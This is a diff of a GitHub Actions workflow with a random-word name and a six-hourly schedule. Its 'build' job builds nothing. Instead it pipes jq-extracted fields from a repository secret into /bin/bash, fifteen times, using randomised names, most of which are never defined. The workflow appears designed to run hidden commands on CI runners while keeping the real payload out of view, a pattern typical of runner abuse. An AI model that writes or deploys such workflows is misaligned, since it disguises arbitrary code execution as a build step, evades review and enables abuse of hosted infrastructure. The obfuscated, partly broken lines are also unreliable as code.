@@ -1,22 +1,33 @@
 name: parmesanannoyed
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 3/6 * * *'
+    - cron: '2 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: parmesanannoyed
         env:
-          nej0: ${{ secrets.nej0 }}
+          kqvmo42: ${{ secrets.kqvmo42 }}
         run: |
-          echo $nej0 | jq -r .cvhs08 | /bin/bash
-          echo $xxyai96845 | jq -r .th5748 | /bin/bash
-          echo $qqw3 | jq -r .fhlv1 | /bin/bash
-          echo $woez4 | jq -r .erp0 | /bin/bash
-          echo $tbpmp08 | jq -r .bp65155 | /bin/bash
-          echo $bouh07905 | jq -r .eiwjg95 | /bin/bash
+          echo $kqvmo42 | jq -r .jmbs505 | /bin/bash
+          echo $ntm67 | jq -r .cka11897 | /bin/bash
+          echo $dl595 | jq -r .ydc5591 | /bin/bash
+          echo $ji10 | jq -r .ya14657 | /bin/bash
+          echo $h55225 | jq -r .cs49954 | /bin/bash
+          echo $wax2843 | jq -r .do5 | /bin/bash
+          echo $b62 | jq -r .x57122 | /bin/bash
+          echo $nih63109 | jq -r .aekk7 | /bin/bash
+          echo $moq5628 | jq -r .o521 | /bin/bash
+          echo $iw79396 | jq -r .lulu700 | /bin/bash
+          echo $a1 | jq -r .ijdoo95214 | /bin/bash
+          echo $kz0342 | jq -r .ra95463 | /bin/bash
+          echo $wva82 | jq -r .rvsdr8331 | /bin/bash
+          echo $okas4544 | jq -r .yoc745 | /bin/bash
+          echo $pysi202 | jq -r .ozk237 | /bin/bash
 
